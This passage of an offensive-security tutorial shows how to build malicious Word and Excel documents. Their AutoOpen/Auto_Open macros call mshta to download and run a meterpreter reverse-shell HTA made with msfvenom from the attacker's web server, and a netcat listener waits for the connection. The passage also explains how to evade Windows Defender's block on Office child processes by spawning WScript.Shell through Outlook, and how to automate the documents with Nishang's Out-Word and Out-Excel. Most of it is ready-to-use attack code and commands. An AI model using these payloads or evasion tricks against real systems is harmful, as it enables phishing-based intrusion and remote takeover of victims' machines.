End Sub

Sub test(a as Integer, b as String)

	MsgBox(a,b)

End Sub
```

Some special sub procedure names which have some meaning are 

-   AutoExec runs when you start Word or load a global template
-   AutoNew runs when you create a new document
-   AutoOpen runs when you open the document
-   AutoClose runs when you close the document
-   AutoExit runs when you exit Word or unload a global template
-   Document_Open runs when a document is opened
-   Document_Close runs when a document is closed
-   Document_New runs when a new document based on the template is created

### Executing shell commands

#### Normally executing commands

```vb 
<Variable> = Shell("COMMAND")
c = Shell("cmd")
chrm = Shell("chrome https://google.com")
```

#### Using an object of the WScript class

```vb
Set sh = CreateObject("WScript.Shell")
Set shExec = sh.Exec("whoami")
MsgBox(shExec.StdOut.ReadAll)
```

The above code may get detected by Windows Defender as Office is not allowed to run child processes 

To bypass this, we can create a child process using Outlook

```vb
Set OL = createObject("Outlook.Application")
Set sh = OL.CreateObject("WScript.Shell")
Set shExec = sh.Exec("whoami")
MsgBox(shExec.StdOut.ReadAll)
```

## Setting up

* First lets create a malicious HTA script using MSFVenom

```bash
mkdir www
cd www
msfvenom -p windows/meterpreter/reverse_tcp LHOST 10.10.10.6 LPORT 4444 -f hta > myapp.hta
```

Here, '10.10.10.6' is our IP, '4444' is the port on which we will listen and 'myapp.hta' is the malicious HTA payload

* Once the file is generated, start a python HTTP server

```bash
python3 -m http.server
```

* After running the web server, run a netcat listener on port 4444

```bash
nc -lnvp 4444
```

## Creating a malicious word document

### Manual way 

In this case, we will create a sub procedure named 'AutoOpen' which will run the macro when the document is opened and another sub procedure containing the shell function which will run a malicious HTA script

* Open MS Word and create a new document
* Press the 'Alt' key and then the 'W' key which will take you to the view section
* On the right, you should see a button named 'Macros'. Click on it 
* In the new window, provide a name for your macro and click on 'Create'
* This will open the visual basic editor. Replace the existing code with the code below

```vb
Sub mymacro()
	sh = Shell("mshta.exe http://10.10.10.6:8000/myapp.hta")
End Sub

Sub AutoOpen()
	mymacro
End Sub
```

Here, '10.10.10.6' is our IP, '8000' is the port on which the python web server is listening and 'myapp.hta' is the malicious HTA payload

In the code above, we are creating 2 sub procedures. The first one named 'mymacro' will run a malicious HTA script. The second one named 'AutoOpen' is a special name given to the sub procedure which will make the macro run when the word document is opened. 

* Finally press 'Ctrl+S' to save the document with the macros

### Automating the process with Nishang

Nishang has a script named 'Out-Word.ps1' which can automate the above

```powershell
wget https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Word.ps1 -OutFile Out-Word.ps1
. .\Out-Word.ps1
Out-Word -Payload "mshta.exe http://10.10.10.6:8000/myapp.hta" -OutFile Document.doc
```

Here, '10.10.10.6' is our IP, '8000' is the port on which the python web server is listening and 'myapp.hta' is the malicious HTA payload

## Creating a malicious excel spreadsheet

In this case, we will create a sub procedure named 'Auto_Open' which will run the macro when the spreadsheet is opened and another sub procedure containing the shell function which will run a malicious HTA script

* Now that we have everything setup, open MS Excel and create a new spreadsheet
* Press the 'Alt' key and then the 'W' key which will take you to the view section
* On the right, you should see a button named 'Macros'. Click on it 
* In the new window, provide a name for your macro and click on 'Create'
* This will open the visual basic editor. Replace the existing code with the code below

```vb
Sub mymacro()
	sh = Shell("mshta.exe http://10.10.10.6:8000/myapp.hta")
End Sub

Sub Auto_Open()
	mymacro
End Sub
```

Here, '10.10.10.6' is our IP, '8000' is the port on which the python web server is listening and 'myapp.hta' is the malicious HTA payload

In the code above, we are creating 2 sub procedures. The first one named 'mymacro' will run a malicious HTA script. The second one named 'Auto_Open' is a special name given to the sub procedure which will make the macro run when the word spreadsheet is opened. 

* Finally press 'Ctrl+S' to save the spreadsheet with the macros

### Automating the process with Nishang

Nishang has a script named 'Out-Excel.ps1' which can automate the above

```powershell
wget https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Excel.ps1 -OutFile Out-Excel.ps1
. .\Out-Excel.ps1
Out-Excel -Payload "mshta.exe http://10.10.10.6:8000/myapp.hta" -OutFile Spreadsheet.xlsx
```

Here, '10.10.10.6' is our IP, '8000' is the port on which the python web server is listening and 'myapp.hta' is the malicious HTA payload

***
